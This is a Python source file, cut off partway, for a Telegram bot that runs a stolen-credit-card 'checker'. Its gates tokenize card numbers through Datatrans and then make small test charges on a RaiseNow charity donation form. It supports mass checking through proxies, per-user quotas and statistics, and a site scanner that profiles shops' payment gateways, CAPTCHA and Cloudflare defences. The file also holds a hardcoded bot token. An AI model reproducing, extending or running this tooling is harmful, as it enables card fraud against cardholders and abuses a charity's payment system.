import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import threading
import random
import psutil # Th√™m th∆∞ vi·ªán ƒë·ªÉ theo d√µi CPU/RAM
import ssl
import socket
import string
from datetime import datetime
from pytz import timezone
from urllib.parse import urlparse
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- C·∫§U H√åNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- T√äN FILE & TH∆Ø M·ª§C L∆ØU TR·ªÆ ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Gi·ªõi h·∫°n cho /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Gi·ªõi h·∫°n cho /multi
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json" # File l∆∞u ng√¥n ng·ªØ
LOG_DIR = "check_logs" # Th∆∞ m·ª•c ch√≠nh l∆∞u log
BOT_STATUS_FILE = "bot_status.json" # File l∆∞u tr·∫°ng th√°i on/off c·ªßa bot
GATE_FILE = "current_gate.json" # File l∆∞u c·ªïng check hi·ªán t·∫°i
GATE_RANGES_FILE = "gate_charge_ranges.json" # File l∆∞u kho·∫£ng charge cho c√°c gate
PROXY_FILE = "proxies.json" # File l∆∞u proxy
GATE8_MODE_FILE = "gate8_mode.json" # <<<--- T√çNH NƒÇNG M·ªöI: File l∆∞u ch·∫ø ƒë·ªô c·ªßa gate 8

# --- GI·ªöI H·∫†N M·∫∂C ƒê·ªäNH CHO TH√ÄNH VI√äN ---
DEFAULT_MEMBER_LIMIT = 100 # Cho /mass
MEMBER_THREAD_LIMIT = 3 # Cho /mass
DEFAULT_MULTI_LIMIT = 10 # Cho /multi

# --- C·∫§U H√åNH M√öI GI·ªú ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BI·∫æN TO√ÄN C·ª§C ---
# ACTIVE_CHECKS gi·ªù l√† dict ƒë·ªÉ l∆∞u th√™m th√¥ng tin v·ªÅ t√°c v·ª• ƒëang ch·∫°y
# {user_id: {"full_name": str, "username": str, "start_time": float, "task_type": str}}
ACTIVE_CHECKS = {}
CANCELLATION_EVENTS = {} # {user_id: threading.Event}
STATS_FILE_LOCK = threading.Lock() # Lock ƒë·ªÉ tr√°nh xung ƒë·ªôt khi nhi·ªÅu user ghi file stats c√πng l√∫c
# <<<--- C·∫¨P NH·∫¨T: TH√äM √ÅNH X·∫† BRAND TH·∫∫ ---<<<
BRAND_TO_PAYMENT_METHOD = { # √Ånh x·∫° brand th·∫ª sang code API
    'VISA': 'VIS',
    'MASTERCARD': 'ECA',
    'AMERICAN EXPRESS': 'AMX',
    'DISCOVER': 'dis',
    'EBS': 'ebs',
    'ELV': 'elv',
    'EPS': 'eps',
    'JCB': 'jcb',
    'MAESTRO': 'mae',
}

# --- TIN NH·∫ÆN TH√îNG B√ÅO ---
MESSAGES_VI = {
    "bot_off": "üî¥ **TH√îNG B√ÅO B·∫¢O TR√å** üî¥\n\nBot hi·ªán ƒëang t·∫°m th·ªùi ngo·∫°i tuy·∫øn ƒë·ªÉ b·∫£o tr√¨. C√°c l·ªánh check s·∫Ω kh√¥ng ho·∫°t ƒë·ªông cho ƒë·∫øn khi c√≥ th√¥ng b√°o m·ªõi. C·∫£m ∆°n s·ª± ki√™n nh·∫´n c·ªßa b·∫°n!",
    "bot_on": "üü¢ **TH√îNG B√ÅO HO·∫†T ƒê·ªòNG** üü¢\n\nBot ƒë√£ ho·∫°t ƒë·ªông tr·ªü l·∫°i. C·∫£m ∆°n b·∫°n ƒë√£ ch·ªù ƒë·ª£i!",
}
MESSAGES_EN = {
    "bot_off": "üî¥ **MAINTENANCE NOTICE** üî¥\n\nThe bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!",
    "bot_on": "üü¢ **SERVICE RESUMED NOTICE** üü¢\n\nThe bot is back online. Thank you for waiting!",
}

# <<<--- C·∫§U H√åNH CHO SITE CHECKER ---<<<
# Danh s√°ch Payment Gateways
GATEWAYS_LIST = [
    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",
    "AVS", "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
    "paycomet", "geomerchant", "realexpayments", "Razorpay",
    "Apple Pay", "Google Pay", "Samsung Pay", "Venmo", "Cash App",
    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
    "Touch n Go", "GoPay", "Dana", "JKOPay", "EasyPaisa",
    "Paytm", "UPI", "PayU", "CCAvenue",
    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
    "Kushki", "DLocal", "RuPay", "BharatPe", "Midtrans", "MOLPay",
    "iPay88", "KakaoPay", "Toss Payments", "NaverPay", "OVO", "GCash",
    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "Atom", "BillDesk",
    "Citrus Pay", "RazorpayX", "Cashfree", "PayUbiz", "EBS",
    "Klarna", "Affirm", "Afterpay", "Zip", "Sezzle",
    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
    "Atome", "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",
    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
    "Binance Pay", "CoinsPaid", "BitGo", "Flexa", "Circle",
    "iDEAL", "Giropay", "Sofort", "Bancontact", "Przelewy24",
    "EPS", "Multibanco", "Trustly", "PPRO", "EcoPayz",
    "ACI Worldwide", "Bank of America Merchant Services",
    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
    "Discover Network", "UnionPay", "JCB Payment Gateway",
    "Plaid", "Stripe Terminal", "Square Terminal", "Adyen Terminal",
    "Toast POS", "Lightspeed Payments", "Poynt", "PAX",
    "SumUp", "iZettle", "Tyro", "Vend", "ShopKeep", "Revel",
    "HiPay", "Dotpay", "PayBox", "PayStack", "Flutterwave",
    "Opayo", "MultiSafepay", "PayXpert", "Bambora", "RedSys",
    "NPCI", "JazzCash", "Blik", "PagBank", "VibePay", "Mode",
    "Primer", "TrueLayer", "GoCardless", "Modulr", "Currencycloud",
    "Volt", "Form3", "Banking Circle", "Mangopay", "Checkout Finland",
    "Vipps", "Swish", "MobilePay"
]
# Patterns ƒë·ªÉ ph√°t hi·ªán CMS/Platform
CMS_PATTERNS = {
    'Shopify': r'cdn\.shopify\.com|shopify\.js',
    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
    'Wix': r'static\.parastorage\.com|wix\.com',
    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
    'WooCommerce': r'wp-content/plugins/woocommerce/',
    'Magento': r'static/version\d+/frontend/|magento/',
    'PrestaShop': r'prestashop\.js|prestashop',
    'OpenCart': r'catalog/view/theme|opencart',
    'WordPress': r'wp-content|wp-includes',
    'Joomla': r'media/jui|joomla\.js|media/system/js|joomla\.javascript',
    'Drupal': r'sites/all/modules|drupal\.js|sites/default/files|drupal\.settings\.js',
}
# Patterns ƒë·ªÉ ki·ªÉm tra b·∫£o m·∫≠t
SECURITY_PATTERNS = {
    'GraphQL': r'graphql|__schema|query\s*{',
}
# >>>--- END SITE CHECKER CONFIG ---<<<

# --- C·∫§U H√åNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KH·ªûI T·∫†O ---
# T·∫°o th∆∞ m·ª•c log n·∫øu ch∆∞a c√≥
os.makedirs(LOG_DIR, exist_ok=True)

# --- QU·∫¢N L√ù USER, DATA & GATE ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE)
    return prefs.get(str(user_id), None)

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE)
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def is_bot_on():
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def get_active_gate():
    gate_data = load_json_file(GATE_FILE, default_data={'gate': '1'})
    return gate_data.get('gate', '1')

def set_active_gate(gate_id):
    save_json_file(GATE_FILE, {'gate': str(gate_id)})

# <<<--- T√çNH NƒÇNG M·ªöI: H√ÄM QU·∫¢N L√ù CH·∫æ ƒê·ªò GATE 8 ---<<<
def get_gate8_mode():
    """L·∫•y ch·∫ø ƒë·ªô hi·ªán t·∫°i c·ªßa Gate 8 (charge ho·∫∑c live)."""
    mode_data = load_json_file(GATE8_MODE_FILE, default_data={'mode': 'live'}) # M·∫∑c ƒë·ªãnh l√† check live
    return mode_data.get('mode', 'live')

def set_gate8_mode(mode):
    """ƒê·∫∑t ch·∫ø ƒë·ªô cho Gate 8."""
    if mode in ['live', 'charge']:
        save_json_file(GATE8_MODE_FILE, {'mode': mode})
# >>>--- K·∫æT TH√öC ---<<<

def _get_charge_value(gate_id, custom_charge_amount=None):
    """L·∫•y gi√° tr·ªã charge: ∆∞u ti√™n custom_amount, r·ªìi ƒë·∫øn range, cu·ªëi c√πng l√† m·∫∑c ƒë·ªãnh."""
    if custom_charge_amount is not None:
        return custom_charge_amount

    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            return random.randint(int(gate_range['min']), int(gate_range['max']))
        except (ValueError, TypeError):
            logger.warning(f"L·ªói ƒë·ªçc range cho gate {gate_id}, s·ª≠ d·ª•ng m·∫∑c ƒë·ªãnh. Range: {gate_range}")
            return 50 # M·∫∑c ƒë·ªãnh 0.5$ n·∫øu range b·ªã l·ªói
    
    # Gate 5 c√≥ m·∫∑c ƒë·ªãnh cao h∆°n
    if str(gate_id) == '5':
        return random.randint(50, 200)

    return 50 # M·∫∑c ƒë·ªãnh 0.5$ cho c√°c c·ªïng kh√°c

def get_formatted_gate_name(gate_id):
    """L·∫•y t√™n gate ƒë√£ ƒë∆∞·ª£c ƒë·ªãnh d·∫°ng v·ªõi th√¥ng tin charge."""
    if str(gate_id) == '7':
        return "Check Live (Gate 7)"
    
    # <<<--- C·∫¨P NH·∫¨T: LOGIC HI·ªÇN TH·ªä T√äN CHO GATE 8 ---<<<
    if str(gate_id) == '8':
        gate8_mode = get_gate8_mode()
        if gate8_mode == 'live':
            return "Check Live (Gate 8)"
        else: # Ch·∫ø ƒë·ªô charge
            default_name = "Charge 0.5$ (Gate 8)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 8)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 8)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
    # >>>--- K·∫æT TH√öC C·∫¨P NH·∫¨T ---<<<

    default_names = {
        '1': "Charge 0.5$ (Gate 1)",
        '2': "Charge 0.5$ V2 (Gate 2)",
        '3': "Charge 0.5$ V3 (Gate 3)",
        '4': "Charge 0.5$ V4 (Gate 4)",
        '5': "Charge 0.5$-2.0$ (Gate 5)",
        '6': "Charge 0.5$ (Gate 6)",
    }
    
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            min_val = int(gate_range['min']) / 100
            max_val = int(gate_range['max']) / 100
            if min_val == max_val:
                return f"Charge {min_val:.2f}$ (Gate {gate_id})"
            else:
                return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate {gate_id})"
        except (ValueError, TypeError):
            return default_names.get(gate_id, f"Unknown Gate {gate_id}")
    else:
        return default_names.get(gate_id, f"Unknown Gate {gate_id}")


def update_user_stats(user_id, user_info, counts):
    # S·ª≠ d·ª•ng lock ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n khi nhi·ªÅu lu·ªìng c√πng c·∫≠p nh·∫≠t file
    with STATS_FILE_LOCK:
        stats = load_json_file(STATS_FILE)
        user_id_str = str(user_id)

        default_user_stat = {
            'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0, 'total_live_success': 0,
            'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
        }
        user_stat_data = stats.get(user_id_str, {})
        if isinstance(user_stat_data, dict):
            default_user_stat.update(user_stat_data)

        stats[user_id_str] = default_user_stat

        stats[user_id_str]['total_charged'] += counts.get('success', 0)
        stats[user_id_str]['total_live_success'] += counts.get('live_success', 0)
        stats[user_id_str]['total_custom'] += counts.get('custom', 0)
        stats[user_id_str]['total_decline'] += counts.get('decline', 0)
        stats[user_id_str]['total_error'] += counts.get('error', 0) + counts.get('gate_dead', 0)
        stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
        stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
        stats[user_id_str]['username'] = user_info.username
        stats[user_id_str]['full_name'] = user_info.full_name

        save_json_file(STATS_FILE, stats)

# --- C√ÅC H√ÄM QU·∫¢N L√ù PROXY ---
def load_proxies():
    """T·∫£i danh s√°ch proxy v√† tr·∫°ng th√°i t·ª´ file JSON."""
    return load_json_file(PROXY_FILE, default_data={"enabled": False, "proxies": []})

def save_proxies(data):
    """L∆∞u danh s√°ch proxy v√† tr·∫°ng th√°i v√†o file JSON."""
    save_json_file(PROXY_FILE, data)

def _format_proxy_for_requests(proxy_str):
    """Chuy·ªÉn ƒë·ªïi chu·ªói proxy sang ƒë·ªãnh d·∫°ng dict cho th∆∞ vi·ªán requests."""
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(':')
    # ip:port
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    # ip:port:user:pass
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    else:
        logger.warning(f"ƒê·ªãnh d·∫°ng proxy kh√¥ng h·ª£p l·ªá: {proxy_str}")
        return None

def _test_proxy(proxy_str: str):
    """Ki·ªÉm tra m·ªôt proxy b·∫±ng c√°ch k·∫øt n·ªëi ƒë·∫øn google.com."""
    proxy_dict = _format_proxy_for_requests(proxy_str)
    if not proxy_dict:
        return False, "ƒê·ªãnh d·∫°ng proxy kh√¥ng h·ª£p l·ªá."
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=7)
        if 200 <= response.status_code < 300:
            return True, f"Th√†nh c√¥ng (Status: {response.status_code})"
        else:
            return False, f"Th·∫•t b·∫°i (Status: {response.status_code})"
    except requests.exceptions.ProxyError as e:
        return False, f"L·ªói Proxy: {e}"
    except requests.exceptions.RequestException as e:
        return False, f"L·ªói k·∫øt n·ªëi: {e}"
# --- K·∫æT TH√öC H√ÄM PROXY ---

# --- C√ÅC H√ÄM C·ªêT L√ïI ---

def generate_random_name(length=8):
    """T·∫°o m·ªôt chu·ªói k√Ω t·ª± ng·∫´u nhi√™n v√† vi·∫øt hoa ch·ªØ c√°i ƒë·∫ßu."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length)).capitalize()

# <<<--- C√ÅC H√ÄM CHO SITE CHECKER ---<<<
def normalize_url(url: str) -> str | None:
    """Chu·∫©n h√≥a URL, th√™m scheme n·∫øu thi·∫øu."""
    if not re.match(r"^(?:f|ht)tps?://", url, re.IGNORECASE):
        url = "http://" + url
    parsed_url = urlparse(url)
    if not all([parsed_url.scheme, parsed_url.netloc]):
        return None
    return f"{parsed_url.scheme}://{parsed_url.netloc}"

def find_payment_gateways(response_text: str) -> list[str]:
    """T√¨m c√°c payment gateway trong n·ªôi dung response."""
    detected = [gateway for gateway in GATEWAYS_LIST if re.search(r'\b' + re.escape(gateway) + r'\b', response_text, re.IGNORECASE)]
    return list(set(detected)) or ["Unknown"]

def find_captcha_details(response_text: str) -> list[str]:
    """T√¨m chi ti·∫øt v·ªÅ c√°c lo·∫°i CAPTCHA."""
    captcha_details = []
    if "recaptcha" in response_text.lower():
        if "recaptcha v1" in response_text.lower():
            captcha_details.append("reCAPTCHA v1")
        if "recaptcha v2" in response_text.lower():
            captcha_details.append("reCAPTCHA v2")
        if "recaptcha v3" in response_text.lower():
            captcha_details.append("reCAPTCHA v3")
        if "recaptcha enterprise" in response_text.lower():
            captcha_details.append("reCAPTCHA Enterprise")
    if "hcaptcha" in response_text.lower():
        captcha_details.append("hCaptcha")
    if "funcaptcha" in response_text.lower():
        captcha_details.append("FunCAPTCHA")
    if "arkoselabs" in response_text.lower():
        captcha_details.append("Arkose Labs")
    
    return captcha_details or ["No CAPTCHA services detected"]

def find_cloudflare_services(response_text: str) -> list[str]:
    """T√¨m c√°c d·ªãch v·ª• b·∫£o m·∫≠t c·ªßa Cloudflare."""
    services = []
    if "cloudflare turnstile" in response_text.lower():
        services.append("Cloudflare Turnstile")
    if "ddos protection" in response_text.lower():
        services.append("DDoS Protection")
    if "web application firewall" in response_text.lower():
        services.append("Web Application Firewall (WAF)")
    if "rate limiting" in response_text.lower():
        services.append("Rate Limiting")
    if "bot management" in response_text.lower():
        services.append("Bot Management")
    if "ssl/tls encryption" in response_text.lower():
        services.append("SSL/TLS Encryption")
    if "zero trust security" in response_text.lower():
        services.append("Zero Trust Security")
        
    return services or ["No Cloudflare services detected"]

def find_checkout_details(response_text: str) -> list[str]:
    """T√¨m c√°c trang li√™n quan ƒë·∫øn thanh to√°n."""
    details = []
    if "checkout" in response_text.lower():
        details.append("Checkout Page")
    if "cart" in response_text.lower():
        details.append("Cart Page")
    if "payment" in response_text.lower():
        details.append("Payment Page")
    if "billing" in response_text.lower():
        details.append("Billing Page")
    if "shipping" in response_text.lower():
        details.append("Shipping Page")
        
    return details or ["No checkout details detected"]

def detect_cms_platform(content: str) -> list[str]:
    """Ph√°t hi·ªán CMS/Platform t·ª´ n·ªôi dung HTML."""
    detected = [cms for cms, pattern in CMS_PATTERNS.items() if re.search(pattern, content, re.IGNORECASE)]
    return list(set(detected))

def check_graphql(content: str) -> bool:
    """Ki·ªÉm tra s·ª± t·ªìn t·∫°i c·ªßa GraphQL."""
    for pattern in SECURITY_PATTERNS.values():
        if re.search(pattern, content, re.IGNORECASE):
            return True
    return False

def check_ssl_details(domain: str) -> dict | None:
    """Ki·ªÉm tra th√¥ng tin ch·ª©ng ch·ªâ SSL."""
    context = ssl.create_default_context()
    try:
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                issuer = dict(x[0] for x in cert.get('issuer', []))
                subject = dict(x[0] for x in cert.get('subject', []))
                return {
                    'issuer': issuer.get('organizationName', 'Unknown'),
                    'subject': subject.get('commonName', 'Unknown'),
                }
    except Exception as e:
        logger.error(f"SSL check failed for {domain}: {e}")
        return None

def perform_website_check(url: str, user: User) -> str:
    """Th·ª±c hi·ªán m·ªôt l·∫ßn ki·ªÉm tra site v√† tr·∫£ v·ªÅ chu·ªói k·∫øt qu·∫£."""
    normalized_url = normalize_url(url)
    if not normalized_url:
        return f"‚ö†Ô∏è URL kh√¥ng h·ª£p l·ªá: `{url}`"

    domain = urlparse(normalized_url).netloc
    start_time = time.time()

    try:
        response = requests.get(normalized_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        response.raise_for_status()
        content = response.text
    except requests.RequestException as e:
        logger.error(f"Failed to fetch {normalized_url}: {e}")
        return f"‚ö†Ô∏è Kh√¥ng th·ªÉ truy c·∫≠p website: `{url}`\nL·ªói: `{e}`"
    
    time_taken = time.time() - start_time
    
    # Th·ª±c hi·ªán t·∫•t c·∫£ c√°c ki·ªÉm tra
    content_lower = content.lower()
    captcha_detected = 'captcha' in content_lower or 'protected by recaptcha' in content_lower or "i'm not a robot" in content_lower
    cloudflare_detected = 'cloudflare' in content_lower or 'cdnjs.cloudflare.com' in content_lower or 'challenges.cloudflare.com' in content_lower

    payment_gateways = find_payment_gateways(content)
    captcha_details = find_captcha_details(content)
    cloudflare_services = find_cloudflare_services(content)
    checkout_details = find_checkout_details(content)
    cms_platforms = detect_cms_platform(content)
    graphql_detected = check_graphql(content)
    ssl_details = check_ssl_details(domain)
    
    # ƒê·ªãnh d·∫°ng k·∫øt qu·∫£
    gateway_text = escape_markdown(', '.join(payment_gateways))
    captcha_text = escape_markdown(', '.join(captcha_details))
    cloudflare_text = escape_markdown(', '.join(cloudflare_services))
    checkout_text = escape_markdown(', '.join(checkout_details))
    cms_text = escape_markdown(', '.join(cms_platforms) or 'None')
    
    ssl_issuer = "L·ªói/Kh√¥ng h·ª£p l·ªá"
    ssl_subject = "L·ªói/Kh√¥ng h·ª£p l·ªá"
    ssl_valid = "‚õî"
    if ssl_details:
        ssl_issuer = escape_markdown(ssl_details['issuer'])
        ssl_subject = escape_markdown(ssl_details['subject'])
        ssl_valid = "‚úÖ"
        
    checked_by = escape_markdown(user.first_name if not user.username else f"@{user.username}")
    
    # X√¢y d·ª±ng tin nh·∫Øn tr·∫£ v·ªÅ
    result_text = (
        f"**üí† WEBSITE CHECK RESULT üí†**\n\n"
        f"üîç **Domain**: `{escape_markdown(domain)}`\n"
        f"üí≥ **Gateways**: `{gateway_text}`\n"
        f"üîí **CAPTCHA**: `{captcha_text}`\n"
        f"‚òÅÔ∏è **Cloudflare**: `{cloudflare_text}`\n"
        f"üõí **Checkout**: `{checkout_text}`\n\n"
        f"üõ°Ô∏è **Security**:\n"
        f"   ‚îú‚îÄ Captcha: {'‚úÖ' if captcha_detected else '‚õî'}\n"
        f"   ‚îú‚îÄ Cloudflare: {'‚úÖ' if cloudflare_detected else '‚õî'}\n"
        f"   ‚îî‚îÄ GraphQL: {'‚úÖ' if graphql_detected else '‚õî'}\n\n"
        f"üîê **SSL Details**:\n"
        f"   ‚îú‚îÄ Issuer: `{ssl_issuer}`\n"
        f"   ‚îú‚îÄ Subject: `{ssl_subject}`\n"
        f"   ‚îî‚îÄ Valid: {ssl_valid}\n\n"
        f"üõçÔ∏è **Platform (CMS)**: `{cms_text}`\n\n"
        f"**‚è±Ô∏è Took**: `{time_taken:.2f}s`\n"
        f"**üë§ Checked by**: {checked_by}"
    )
    return result_text
# >>>--- END SITE CHECKER FUNCTIONS ---<<<


def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
            
        try:
            # **kwargs c√≥ th·ªÉ ch·ª©a 'proxies' n·∫øu n√≥ ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ check_card
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"L·∫ßn th·ª≠ {attempt + 1}/{max_retries} cho {url} th·∫•t b·∫°i: {e}. Th·ª≠ l·∫°i sau {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: T·∫•t c·∫£ {max_retries} l·∫ßn th·ª≠ l·∫°i cho {url} ƒë·ªÅu th·∫•t b·∫°i. L·ªói cu·ªëi c√πng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "S·ªë th·∫ª (CC) ph·∫£i c√≥ t·ª´ 10-19 ch·ªØ s·ªë."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Th√°ng (MM) ph·∫£i l√† s·ªë t·ª´ 1 ƒë·∫øn 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "NƒÉm (YY) ph·∫£i c√≥ 2 ho·∫∑c 4 ch·ªØ s·ªë."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV ph·∫£i c√≥ 3 ho·∫∑c 4 ch·ªØ s·ªë."
    return True, ""

def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 1"""
    try:
        charge_value = _get_charge_value('1', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
        
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info
        
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info
        
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
